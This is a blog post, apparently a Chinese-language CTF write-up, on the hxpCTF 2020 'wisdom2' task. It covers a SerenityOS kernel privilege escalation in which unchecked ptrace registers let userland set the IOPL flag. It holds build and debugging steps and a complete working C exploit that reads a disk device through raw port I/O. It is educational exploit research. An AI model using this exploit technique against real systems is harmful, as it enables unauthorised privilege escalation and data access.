@@ -1,0 +1,340 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>hxpCTF2020 wisdom2：Ptrace参数未校验引发的SerenityOS内核提权 | Sung3r&#39;s Blog</title>
+  <meta name="author" content="sung3r">
+  
+  <meta name="description" content="hxpCTF2020 wisdom2的解题思路">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="hxpCTF2020 wisdom2：Ptrace参数未校验引发的SerenityOS内核提权"/>
+  <meta property="og:site_name" content="Sung3r&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Sung3r&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> hxpCTF2020 wisdom2：Ptrace参数未校验引发的SerenityOS内核提权</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> hxpCTF2020 wisdom2的解题思路
+		 </div> <!-- alert -->
+	  		
+
+	  <p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">hxpCTF2020 wisdom2：Ptrace参数未校验引发的SerenityOS内核提权</a></p>
+<p>本题来源于hxpCTF 2020的wisdom2，是36c3 wisdom的升级版<a href="https://www.anquanke.com/post/id/228782" target="_blank" rel="noopener">CVE-2019-20172：36C3 wisdom中的SerenityOS内核提权</a>，该漏洞存在于serenityOS在2020年12月23日以前提交的版本。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619515380642-1619515380645.png" alt="title"><br>漏洞存在于sys$ptrace()与sys$sigreturn()方法，允许Userland修改Kerneland的寄存器，进一步可实现内核提权。通过修改eflags的IOPL标志位，可对系统I/O设备进行读写操作。</p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">Oops, I did it again. :^)</span><br><span class="line"></span><br><span class="line">This is commit # 4232874270015d940a2ba62c113bcf12986a2151 with the attached patch applied. Flag is in &#x2F;dev&#x2F;hdb.</span><br><span class="line"></span><br><span class="line">Note that the setup of this task is perhaps a bit shaky: If you don’t get a shell prompt within a few seconds after solving the proof of work, something is wrong. Each connection has a time limit of 10 minutes; you may contact us in case this causes problems for you.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line">wisdom2-c46f03732e9dceef.tar.xz (19.4 MiB)</span><br><span class="line"></span><br><span class="line">Connection:</span><br><span class="line">telnet 157.90.19.161 2323</span><br></pre></td></tr></table></figure>
+
+<h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>拉取对应源码<a href="https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151" target="_blank" rel="noopener">https://github.com/SerenityOS/serenity/tree/4232874270015d940a2ba62c113bcf12986a2151</a></p>
+<p>按照<code>Documentation/BuildInstructions.md</code>安装依赖，并且编译Toolchain和Kernel</p>
+<p>先打上patch</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply &#x2F;path&#x2F;to&#x2F;hxp.patch</span><br></pre></td></tr></table></figure>
+
+<p>编译Toolchain</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Toolchain</span><br><span class="line">.&#x2F;BuildIt.sh</span><br></pre></td></tr></table></figure>
+
+<p>编译Kernel</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">cd Build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make image</span><br><span class="line">make run</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/26/1619425103900-1619425103927.png" alt="title"></p>
+<p>exp编译，将exp.cpp放<code>$SERENITY_ROOT/Userland</code>，cd进<code>$SERENITY_ROOT/Build</code>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -C .&#x2F;Userland&#x2F;</span><br></pre></td></tr></table></figure>
+<p>在<code>$SERENITY_ROOT/Build/Userland</code>看到编译好的exp<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/26/1619426036343-1619426036345.png" alt="title"></p>
+<p>通过nc传exp<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/26/1619426326223-1619426326226.png" alt="title"></p>
+<p>执行报错，貌似这样编译出来的binary没法运行<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619509288800-1619509288805.png" alt="title"></p>
+<p>解决方法是将<code>exp</code>源码放在Userland目录后，cd到Build目录，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br><span class="line">make image</span><br></pre></td></tr></table></figure>
+<p>重新生成Kernel，exp成功执行<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619509526566-1619509526568.png" alt="title"></p>
+<h1 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h1><h2 id="0x01-Vulnerable"><a href="#0x01-Vulnerable" class="headerlink" title="0x01 Vulnerable"></a>0x01 Vulnerable</h2><p>漏洞成因是：Ptrace传入regs组未加任何检查便传递给kernel_regs，导致可以任意修改Kernel寄存器值<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619513308747-1619513308750.png" alt="title"></p>
+<p>利用过程只需将<code>kernel_regs.eflags</code>的IOPL位(12/13 bits)置1，从而允许Userland访问系统I/O。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619513816570-1619513816573.png" alt="title"></p>
+<h2 id="0x02-Debug"><a href="#0x02-Debug" class="headerlink" title="0x02 Debug"></a>0x02 Debug</h2><p>修改<code>run.sh</code>，添加<code>-s</code>参数，启用调试接口<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/26/1619427151341-1619427151342.png" alt="title"></p>
+<p>gdb attach上去<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/26/1619427217995-1619427217999.png" alt="title"></p>
+<p>在<code>copy_ptrace_registers_into_kernel_registers</code>打断点</p>
+<p>exp修改成将kernel_regs.edi置0xdeadbeef，编译后传到serenityOS<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619514314381-1619514314382.png" alt="title"></p>
+<p>Kernel的edi寄存器已被置0xdeadbeef<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619514524143-1619514524146.png" alt="title"></p>
+<h2 id="0x03-Read-flag"><a href="#0x03-Read-flag" class="headerlink" title="0x03 Read flag"></a>0x03 Read flag</h2><p>flag.txt是以设备的形式挂载到<code>/dev/hdb</code>，由于现在只有Userland访问I/O的权限，没法调Kernel里的<code>get_device</code>等设备操纵方法（需要特权）</p>
+<p>可以看到<code>Device::get_device</code>、<code>DiskDevice::read</code>方法位于Kerneland，Userland没法调，也就是没法利用wisdom1的方法去读flag<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619512385203-1619512385207.png" alt="title"></p>
+<p>通过<code>DiskDevice::read</code>方法去读flag，导致Processor Halt<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619513698498-1619513698499.png" alt="title"></p>
+<p>解决办法是利用现成的ATA PIO驱动程序读取flag，<a href="https://github.com/dhavalhirdhav/LearnOS/blob/fe764387c9f01bf67937adac13daace909e4093e/drivers/ata/ata.c" target="_blank" rel="noopener">https://github.com/dhavalhirdhav/LearnOS/blob/fe764387c9f01bf67937adac13daace909e4093e/drivers/ata/ata.c</a><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619513035656-1619513035659.png" alt="title"></p>
+<h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><p>完整的exploit</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/cdefs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;LibC/sys/arch/i386/regs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IDE Reading Code taken from https://github.com/dhavalhirdhav/LearnOS/blob/fe764387c9f01bf67937adac13daace909e4093e/drivers/ata/ata.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_BSY 0x80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_RDY 0x40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_DRQ 0x08</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_DF 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_ERR 0x01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -Wall, -Werror :(</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">raiseIOPL</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">port_byte_in</span><span class="params">(<span class="keyword">unsigned</span> short port)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">port_word_in</span> <span class="params">(<span class="keyword">uint16_t</span> port)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">port_byte_out</span><span class="params">(<span class="keyword">unsigned</span> short port, <span class="keyword">unsigned</span> <span class="keyword">char</span> data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ATA_wait_BSY</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ATA_wait_DRQ</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_sectors_ATA_PIO</span><span class="params">(<span class="keyword">uint32_t</span> target_address, <span class="keyword">uint32_t</span> LBA, <span class="keyword">uint8_t</span> sector_count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">port_byte_in</span> <span class="params">(<span class="keyword">unsigned</span> short port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> result;</span><br><span class="line">    __asm__(<span class="string">"in %%dx, %%al"</span> : <span class="string">"=a"</span> (result) : <span class="string">"d"</span> (port));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">port_byte_out</span> <span class="params">(<span class="keyword">unsigned</span> short port, <span class="keyword">unsigned</span> <span class="keyword">char</span> data)</span> </span>&#123;</span><br><span class="line">    __asm__(<span class="string">"out %%al, %%dx"</span> : : <span class="string">"a"</span> (data), <span class="string">"d"</span> (port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">port_word_in</span> <span class="params">(<span class="keyword">uint16_t</span> port)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> result;</span><br><span class="line">    __asm__(<span class="string">"in %%dx, %%ax"</span> : <span class="string">"=a"</span> (result) : <span class="string">"d"</span> (port));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0x1F0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_sectors_ATA_PIO</span><span class="params">(<span class="keyword">uint32_t</span> target_address, <span class="keyword">uint32_t</span> LBA, <span class="keyword">uint8_t</span> sector_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ATA_wait_BSY();</span><br><span class="line">    port_byte_out(BASE + <span class="number">6</span>,<span class="number">0xE0</span> | ((LBA &gt;&gt;<span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0x10</span> <span class="comment">/* drive 2 */</span>);</span><br><span class="line">    port_byte_out(BASE + <span class="number">2</span>,sector_count);</span><br><span class="line">    port_byte_out(BASE + <span class="number">3</span>, (<span class="keyword">uint8_t</span>) LBA);</span><br><span class="line">    port_byte_out(BASE + <span class="number">4</span>, (<span class="keyword">uint8_t</span>)(LBA &gt;&gt; <span class="number">8</span>));</span><br><span class="line">    port_byte_out(BASE + <span class="number">5</span>, (<span class="keyword">uint8_t</span>)(LBA &gt;&gt; <span class="number">16</span>));</span><br><span class="line">    port_byte_out(BASE + <span class="number">7</span>,<span class="number">0x20</span>); <span class="comment">//Send the read command</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> *target = (<span class="keyword">uint16_t</span>*) target_address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;sector_count;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        ATA_wait_BSY();</span><br><span class="line">        ATA_wait_DRQ();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">            target[i] = port_word_in(BASE);</span><br><span class="line">        target+=<span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ATA_wait_BSY</span><span class="params">()</span>   <span class="comment">//Wait for bsy to be 0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(port_byte_in(BASE + <span class="number">7</span>)&amp;STATUS_BSY);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ATA_wait_DRQ</span><span class="params">()</span>  <span class="comment">//Wait fot drq to be 1</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!(port_byte_in(BASE + <span class="number">7</span>)&amp;STATUS_RDY));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Actual exploit here</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">raiseIOPL</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        <span class="keyword">pid_t</span> g_pid = pid;</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PT_ATTACH, g_pid, <span class="number">0</span>, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"attach"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (waitpid(g_pid, &amp;status, WSTOPPED | WEXITED) != g_pid || !WIFSTOPPED(status)) &#123;</span><br><span class="line">            perror(<span class="string">"waitpid"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ptrace(PT_SYSCALL, g_pid, <span class="number">0</span>, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"syscall"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (waitpid(g_pid, &amp;status, WSTOPPED | WEXITED) != g_pid || !WIFSTOPPED(status)) &#123;</span><br><span class="line">            perror(<span class="string">"waitpid"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PtraceRegisters regs = &#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PT_GETREGS, g_pid, &amp;regs, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"getregs"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        regs.cs = <span class="number">3</span>;</span><br><span class="line">        regs.eflags |= <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ptrace(PT_SETREGS, g_pid, &amp;regs, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"setregs"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ptrace(PT_DETACH, g_pid, <span class="number">0</span>, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"detach"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Testing if IOPL has been raised..."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> flags = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"pushf\npop %0\n"</span> : <span class="string">"=r"</span> (flags))</span></span>;</span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; <span class="number">0x3000</span>) == <span class="number">0x3000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Successfully raised IOPL!"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Failed to raise IOPL!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">char</span>**)</span> </span>&#123;</span><br><span class="line">    raiseIOPL();</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">512</span>);</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"cli"</span>)</span></span>;</span><br><span class="line">    read_sectors_ATA_PIO((<span class="keyword">uint32_t</span>) data, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"sti"</span>)</span></span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag: %s\n"</span>, (<span class="keyword">char</span>*) data);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/04/27/1619514870891-1619514870893.png" alt="title"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/05/21/hxpCTF2020-wisdom2%EF%BC%9APtrace%E5%8F%82%E6%95%B0%E6%9C%AA%E6%A0%A1%E9%AA%8C%E5%BC%95%E5%8F%91%E7%9A%84SerenityOS%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" class="leancloud-visitors view" data-flag-title="hxpCTF2020 wisdom2：Ptrace参数未校验引发的SerenityOS内核提权">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/01/31/CVE-2019-20172：36C3 wisdom中的SerenityOS内核提权/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
